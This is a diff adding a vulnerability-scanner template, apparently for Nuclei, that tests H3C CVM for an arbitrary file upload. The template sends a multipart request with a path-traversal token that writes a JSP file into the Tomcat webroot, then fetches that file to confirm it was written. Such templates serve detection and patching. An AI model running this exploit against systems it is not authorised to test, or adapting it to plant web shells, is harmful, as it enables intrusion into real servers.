@@ -1,0 +1,58 @@
+id: poc-h3c-cvm-fd-anyfile-upload
+info:
+  name: H3C CVM Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload,h3c,cvm
+  description: |
+    Exploits an arbitrary file upload vulnerability in H3C CVM, allowing attackers to upload files to a specific directory.
+
+variables:
+  t1: "{{rand_base(5)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/cas/fileUpload/fd"
+    headers:
+      Content-Type: multipart/form-data; boundary=a4d7586ac9d50625dee11e86fa69bc71
+    body: |-
+      --a4d7586ac9d50625dee11e86fa69bc71
+      Content-Disposition: form-data; name="token"
+
+      /../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{t1}}.jsp
+      --a4d7586ac9d50625dee11e86fa69bc71
+      Content-Disposition: form-data; name="file"; filename="321.jsp"
+      Content-Type: image/png
+
+      {{t2}}
+      --a4d7586ac9d50625dee11e86fa69bc71--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "success"
+          - "true"
+        part: body
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/cas/js/lib/buttons/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
